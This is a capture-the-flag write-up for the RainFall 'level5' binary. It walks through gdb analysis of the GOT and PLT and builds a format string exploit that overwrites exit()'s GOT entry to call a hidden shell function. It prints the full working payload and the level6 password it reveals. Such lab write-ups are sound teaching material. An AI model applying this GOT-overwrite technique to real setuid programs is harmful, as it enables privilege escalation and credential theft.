level5
======

*	We spawn with a [level5](src/level5) executable
	```console
	level5@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
	level5@RainFall:~$ ./level5 


	level5@RainFall:~$ ./level5 
	qweqweqwe
	qweqweqwe
	```
*	We have 3 functions ([code here](src/level5.c)):
	-	`main` calling `n`
	-	`n` creates a 520 bytes variable, `fgets` on it and then `printf` it
	-	`o` calls `/bin/sh``
*	The trick here is that `o` is never called but its our way out. One way would be the change the function the pointer of `exit()` points to, to make it point towards `o`
*	There is a section inside of programs that is called the [Global Offset Table (GOT)](https://en.wikipedia.org/wiki/Global_Offset_Table). It holds addresses of functions that are dynamically linked unless a program is marked full RELRO. Most programs don't include every function they use to reduce binary size. Instead, common functions are "linked" into the program so they can be saved once on disk and reused by every program. This [website](https://ctf101.org/binary-exploitation/what-is-the-got/) explains it well. It is important for us to understand this to be able to retrieve the real address pointing to `exit()`. 
*	Let's try to find it in `gdb` :
	```gdb
	(gdb) info files
		[...]
		0x08049814 - 0x08049818 is .got
		0x08049818 - 0x08049840 is .got.plt
	```
	Here we get the address were we can find the `got` and the `Procedure Linkage Table (PLT)` which is a function that allow the program to understand which name of function is linked to what.
	```gdb
	(gdb) info functions
		[...]
		0x08048334  _init
		0x08048380  printf
		0x08048380  printf@plt
		0x08048390  _exit
		0x08048390  _exit@plt
		0x080483a0  fgets
		0x080483a0  fgets@plt
		0x080483b0  system
		0x080483b0  system@plt
	```
	Here we can see they really are treated by `plt`
	```gdb
	(gdb) disas n
		[...]
		0x080484ff <+61>:    call   0x80483d0 <exit@plt>
	```
	Same thing when we look at the function, let's take a look at this address
	```gdb
	(gdb) disas 0x80483d0
	Dump of assembler code for function exit@plt:
		0x080483d0 <+0>:     jmp    *0x8049838
		0x080483d6 <+6>:     push   $0x28
		0x080483db <+11>:    jmp    0x8048370
	```
	This is how every function is treated in the `plt`
	```gdb
	(gdb) x 0x8049838
		0x8049838 <exit@got.plt>:       0x080483d6
	```
	This is a value so we have to use `x` and not `disas`. And now we have the certitude that the `jmp` was poiting to the real address of exit -> `0x8049838`
*	This was quite long but I did my best to make it short. Now let's retrieve the address of `o()`:
	```gdb
	(gdb) x o
		0x80484a4 <o>:  0x83e58955
	```
	We get this `0x80484a4`
*	There is something else to know. Here we are working with a format string attack and not a buffer overflow as we did before. The difference is that we can't really "write" address, only thing we can do is "add" byte value with `%d`, so to access that address, we will need to add as much byte as necessary AND in decimal since the flag only takes decimals.
*	Index can be find at the `4th` position
	```console
	level5@RainFall:~$ ./level5 
	%x %x %x %x %x %x %x
	200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825
	```
	We don't really need to add random char to find it when we know ascii of `%x `
*	Let's finally build the payload:
	-	little endian of `exit()` -> `\x38\x98\x04\x08`
	-	value of the address of `o()` : `0x80484a4(HEX)` -> `134513828(DEC)`
	-	index of `%4$n`
	```console
	level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/payload5
	level5@RainFall:~$ cat /tmp/payload5 - | ./level5
	[...]
	  512
	whoami
	level6
	cat /home/user/level6/.pass
	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
	```